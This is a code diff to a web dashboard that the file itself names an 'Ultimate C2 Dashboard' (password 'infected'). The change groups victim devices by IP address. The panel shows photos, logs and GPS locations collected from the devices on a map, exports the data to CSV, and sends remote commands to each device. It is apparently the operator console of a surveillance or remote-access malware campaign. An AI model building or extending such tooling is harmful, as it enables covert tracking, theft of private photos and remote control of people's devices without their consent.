@@ -8,7 +8,7 @@
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
         /* ============================================================
-           GOOGLE MATERIAL DESIGN – DARK THEME (same as before)
+           GOOGLE MATERIAL DESIGN – DARK THEME
            ============================================================ */
         *{margin:0;padding:0;box-sizing:border-box}
         body{background:#0a0a12;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;background-image:radial-gradient(ellipse at 50% 0%,#1a1a2e 0%,#0a0a12 70%)}
@@ -146,11 +146,11 @@
             <button class="refresh-btn" id="refreshBtn"><span class="icon">🔄</span> Refresh</button>
             <label><input type="checkbox" id="autoRefreshToggle"> Auto-Refresh (5s)</label>
             <button class="export-btn" id="exportCsvBtn">📥 Export CSV</button>
-            <span class="info-text">Manual refresh — click to update</span>
+            <span class="info-text">Devices are grouped by IP address</span>
         </div>
 
         <div class="stats-bar" id="statsBar">
-            <div class="stat">📱 Devices: <span class="num" id="statDevices">0</span></div>
+            <div class="stat">📱 Devices (IP groups): <span class="num" id="statDevices">0</span></div>
             <div class="stat">📸 Photos: <span class="num" id="statPhotos">0</span></div>
             <div class="stat">📍 Locations: <span class="num" id="statLocations">0</span></div>
             <div class="stat">📋 Logs: <span class="num" id="statLogs">0</span></div>
@@ -255,13 +255,17 @@
             const backend = getConfig('backend_url');
             const devices = await fetchJSON(`${backend}/api/devices`);
             if (!devices) return;
-            let csv = 'Device ID,IP,Platform,Screen,Last Seen,Notes\n';
-            devices.forEach(d => {
-                csv += `${d.id},${d.ip},${d.platform},${d.screen},${new Date(d.last_seen).toLocaleString()},${(d.notes||'').replace(/,/g,';')}\n`;
-            });
+            let csv = 'IP,Platform,Screen,Last Seen,Notes,Device IDs\n';
+            // Group by IP for export
+            const groups = groupByIp(devices);
+            for (const [ip, list] of Object.entries(groups)) {
+                const latest = list.reduce((a,b) => a.last_seen > b.last_seen ? a : b);
+                const ids = list.map(d => d.id).join(';');
+                csv += `${ip},${latest.platform},${latest.screen},${new Date(latest.last_seen).toLocaleString()},${(latest.notes||'').replace(/,/g,';')},${ids}\n`;
+            }
             const blob = new Blob([csv], { type: 'text/csv' });
             const url = URL.createObjectURL(blob);
-            const a = document.createElement('a'); a.href = url; a.download = `devices_${Date.now()}.csv`; a.click(); URL.revokeObjectURL(url);
+            const a = document.createElement('a'); a.href = url; a.download = `devices_grouped_${Date.now()}.csv`; a.click(); URL.revokeObjectURL(url);
         }
         exportCsvBtn.addEventListener('click', exportCsv);
 
@@ -346,12 +350,31 @@
         historyModal.addEventListener('click', function(e) { if (e.target === this) this.classList.remove('open'); });
 
         // ============================================================
-        //  GET DEVICE STATUS
+        //  GROUP DEVICES BY IP
         // ============================================================
-        function getDeviceStatus(lastSeen) { return (Date.now() - lastSeen) < 60000 ? 'online' : 'offline'; }
+        function groupByIp(devices) {
+            const groups = {};
+            devices.forEach(d => {
+                const key = d.ip || 'unknown';
+                if (!groups[key]) groups[key] = [];
+                groups[key].push(d);
+            });
+            return groups;
+        }
 
         // ============================================================
-        //  LOAD DEVICES (with Map integration)
+        //  GET DEVICE STATUS (online if any device in group has last_seen < 60s)
+        // ============================================================
+        function getGroupStatus(devices) {
+            const now = Date.now();
+            for (const d of devices) {
+                if ((now - d.last_seen) < 60000) return 'online';
+            }
+            return 'offline';
+        }
+
+        // ============================================================
+        //  LOAD DEVICES – GROUP BY IP AND MERGE DATA
         // ============================================================
         async function loadDevices() {
             if (isLoading) return;
@@ -368,19 +391,44 @@
                 isLoading = false; refreshBtn.textContent='🔄 Refresh'; refreshBtn.disabled=false; return;
             }
 
-            let totalPhotos=0, totalLogs=0, totalLocations=0;
+            // Group by IP
+            const groups = groupByIp(devices);
+            const groupKeys = Object.keys(groups);
+            statDevices.textContent = groupKeys.length;
+
+            let totalPhotos = 0, totalLogs = 0, totalLocations = 0;
             deviceGrid.innerHTML = '';
 
-            for (const d of devices) {
-                const details = await fetchJSON(`${backend}/api/device-details?deviceId=${encodeURIComponent(d.id)}`);
-                const photos = details?.photos || [];
-                const logs = details?.logs || [];
-                const locations = details?.locations || [];
-                const files = details?.files || [];
-                const pc = photos.length, lc = logs.length, locc = locations.length;
+            for (const ip of groupKeys) {
+                const deviceList = groups[ip];
+                // Pick the most recent device for basic info
+                const latest = deviceList.reduce((a,b) => a.last_seen > b.last_seen ? a : b);
+                // Collect all device IDs for this IP
+                const ids = deviceList.map(d => d.id);
+                // Fetch details for each device and merge
+                let allPhotos = [], allLogs = [], allLocations = [], allFiles = [], allCommands = [], allResults = [];
+                for (const id of ids) {
+                    const details = await fetchJSON(`${backend}/api/device-details?deviceId=${encodeURIComponent(id)}`);
+                    if (details) {
+                        allPhotos = allPhotos.concat(details.photos || []);
+                        allLogs = allLogs.concat(details.logs || []);
+                        allLocations = allLocations.concat(details.locations || []);
+                        allFiles = allFiles.concat(details.files || []);
+                        allCommands = allCommands.concat(details.commands || []);
+                        allResults = allResults.concat(details.results || []);
+                    }
+                }
+                // Sort by timestamp descending for each
+                allPhotos.sort((a,b) => b.timestamp - a.timestamp);
+                allLogs.sort((a,b) => b.timestamp - a.timestamp);
+                allLocations.sort((a,b) => b.timestamp - a.timestamp);
+                allFiles.sort((a,b) => b.timestamp - a.timestamp);
+                allCommands.sort((a,b) => b.sent_at - a.sent_at);
+
+                const pc = allPhotos.length, lc = allLogs.length, locc = allLocations.length;
                 totalPhotos += pc; totalLogs += lc; totalLocations += locc;
 
-                const status = getDeviceStatus(d.last_seen);
+                const status = getGroupStatus(deviceList);
                 const statusClass = status === 'online' ? 'status-online' : 'status-offline';
                 const statusDot = status === 'online' ? 'online' : 'offline';
                 const statusLabel = status === 'online' ? 'Online' : 'Offline';
@@ -388,15 +436,15 @@
                 // ---- MAP ----
                 let mapHtml = '';
                 if (locc > 0) {
-                    const lastLoc = locations[0];
-                    mapHtml = `<div class="map-container" id="map_${d.id}"></div>`;
+                    const lastLoc = allLocations[0];
+                    mapHtml = `<div class="map-container" id="map_${ip}"></div>`;
                 }
 
                 // ---- PHOTOS ----
                 let photoHtml = '<div class="photo-grid">';
                 if (pc === 0) photoHtml += '<span class="no-data">No photos</span>';
                 else {
-                    photos.slice(0, 8).forEach(p => {
+                    allPhotos.slice(0, 8).forEach(p => {
                         let url = p.publicUrl || p.file_path || (p.data_url && p.data_url.startsWith('data:') ? p.data_url : '');
                         if (url) photoHtml += `<img src="${url}" alt="photo" onclick="window.open('${url}')" loading="lazy" />`;
                     });
@@ -408,7 +456,7 @@
                 let logHtml = '<div class="log-area">';
                 if (lc === 0) logHtml += '<span style="color:#4a6a7a;">No logs</span>';
                 else {
-                    logs.slice(0, 10).forEach(l => {
+                    allLogs.slice(0, 10).forEach(l => {
                         logHtml += `<div class="log-entry"><span class="time">${new Date(l.timestamp).toLocaleTimeString()}</span><span class="lvl-${l.level||'info'}">${l.message||''}</span></div>`;
                     });
                     if (lc > 10) logHtml += `<div style="color:#4a6a7a;font-size:10px;">+${lc-10} more</div>`;
@@ -419,25 +467,29 @@
                 let locHtml = '<div class="loc-list">';
                 if (locc === 0) locHtml += '<span style="color:#4a6a7a;font-size:11px;">No locations</span>';
                 else {
-                    locations.slice(0, 5).forEach(l => {
+                    allLocations.slice(0, 5).forEach(l => {
                         locHtml += `<div class="loc-entry"><span class="coords">📍 ${l.lat}, ${l.lon}</span><span class="time">${new Date(l.timestamp).toLocaleTimeString()}</span></div>`;
                     });
                     if (locc > 5) locHtml += `<span style="color:#4a6a7a;font-size:10px;">+${locc-5} more</span>`;
                 }
                 locHtml += '</div>';
 
-                // ---- CARD ----
+                // ---- Use a representative deviceId for notes and commands (the latest one) ----
+                const repId = latest.id;
+
+                // ---- Build card ----
                 const card = document.createElement('div');
                 card.className = 'device-card';
                 card.innerHTML = `
                     <div style="display:flex;justify-content:space-between;align-items:center;">
-                        <div class="device-ip">${d.ip || 'Unknown IP'}</div>
+                        <div class="device-ip">${ip}</div>
                         <span class="status-indicator ${statusClass}"><span class="status-dot ${statusDot}"></span> ${statusLabel}</span>
                     </div>
                     <div class="device-meta">
-                        <div><span class="label">Device:</span> ${d.platform || 'Unknown'}</div>
-                        <div><span class="label">Screen:</span> ${d.screen || 'Unknown'}</div>
-                        <div><span class="label">Last seen:</span> <span class="highlight">${new Date(d.last_seen).toLocaleString()}</span></div>
+                        <div><span class="label">Platform:</span> ${latest.platform || 'Unknown'}</div>
+                        <div><span class="label">Screen:</span> ${latest.screen || 'Unknown'}</div>
+                        <div><span class="label">Devices:</span> ${ids.length} (IDs: ${ids.join(', ')})</div>
+                        <div><span class="label">Last seen:</span> <span class="highlight">${new Date(latest.last_seen).toLocaleString()}</span></div>
                         <div class="row" style="margin-top:6px;padding-top:6px;border-top:1px solid rgba(42,42,68,0.2);">
                             <span><span class="label">📸 Photos:</span> ${pc}</span>
                             <span><span class="label">📋 Logs:</span> ${lc}</span>
@@ -446,18 +498,18 @@
                     </div>
 
                     <div class="notes-area">
-                        <input type="text" id="notes_input_${d.id}" placeholder="Add note..." value="${d.notes || ''}" />
-                        <button onclick="updateNotes('${d.id}')">💾</button>
+                        <input type="text" id="notes_input_${repId}" placeholder="Add note..." value="${latest.notes || ''}" />
+                        <button onclick="updateNotes('${repId}')">💾</button>
                     </div>
 
                     <div class="command-section">
-                        <input type="text" id="cmd_input_${d.id}" placeholder="Enter command..." />
-                        <button class="btn btn-primary" onclick="sendCommand('${d.id}')">📤 Send</button>
+                        <input type="text" id="cmd_input_${repId}" placeholder="Enter command..." />
+                        <button class="btn btn-primary" onclick="sendCommand('${repId}')">📤 Send</button>
                     </div>
                     <div style="display:flex;gap:6px;margin-top:8px;flex-wrap:wrap;">
-                        <button class="btn" onclick="showHistory('${d.id}')">📜 History</button>
-                        <button class="btn" onclick="window.open('/api/photos?deviceId=${d.id}')">📸 Photos</button>
-                        <button class="btn btn-danger" onclick="deleteDevice('${d.id}')">🗑️ Remove</button>
+                        <button class="btn" onclick="showHistory('${repId}')">📜 History</button>
+                        <button class="btn" onclick="window.open('/api/photos?deviceId=${repId}')">📸 Photos</button>
+                        <button class="btn btn-danger" onclick="deleteDevice('${repId}')">🗑️ Remove</button>
                     </div>
 
                     <div class="section-title">📸 Photos <span class="count">${pc}</span></div>
@@ -470,16 +522,15 @@
                 `;
                 deviceGrid.appendChild(card);
 
-                // ---- INIT MAP ----
-                if (locc > 0 && document.getElementById(`map_${d.id}`)) {
-                    const lastLoc = locations[0];
-                    const map = L.map(`map_${d.id}`).setView([lastLoc.lat, lastLoc.lon], 13);
+                // ---- Init map ----
+                if (locc > 0 && document.getElementById(`map_${ip}`)) {
+                    const lastLoc = allLocations[0];
+                    const map = L.map(`map_${ip}`).setView([lastLoc.lat, lastLoc.lon], 13);
                     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OpenStreetMap' }).addTo(map);
-                    L.marker([lastLoc.lat, lastLoc.lon]).addTo(map).bindPopup(`Device: ${d.ip}<br>Last: ${new Date(lastLoc.timestamp).toLocaleString()}`);
+                    L.marker([lastLoc.lat, lastLoc.lon]).addTo(map).bindPopup(`IP: ${ip}<br>Last: ${new Date(lastLoc.timestamp).toLocaleString()}`);
                 }
             }
 
-            statDevices.textContent = devices.length;
             statPhotos.textContent = totalPhotos;
             statLogs.textContent = totalLogs;
             statLocations.textContent = totalLocations;
@@ -488,10 +539,10 @@
         }
 
         // ============================================================
-        //  DELETE DEVICE
+        //  DELETE DEVICE (deletes all devices with that IP? we'll delete only the representative one)
         // ============================================================
         async function deleteDevice(deviceId) {
-            if (!confirm(`Are you sure you want to remove device ${deviceId}?`)) return;
+            if (!confirm(`Are you sure you want to remove device ${deviceId}? (This will only delete this one entry)`)) return;
             const backend = getBackend();
             const result = await fetch(`${backend}/api/delete-device`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceId }) });
             if (result.ok) loadDevices();
@@ -505,7 +556,7 @@
         checkAuth();
         if (!dashboardContainer.classList.contains('active')) passwordInput.focus();
 
-        console.log('☠️ Ultimate C2 Dashboard loaded');
+        console.log('☠️ Ultimate C2 Dashboard loaded (Grouped by IP)');
         console.log('🔐 Password: infected');
     </script>
 </body>
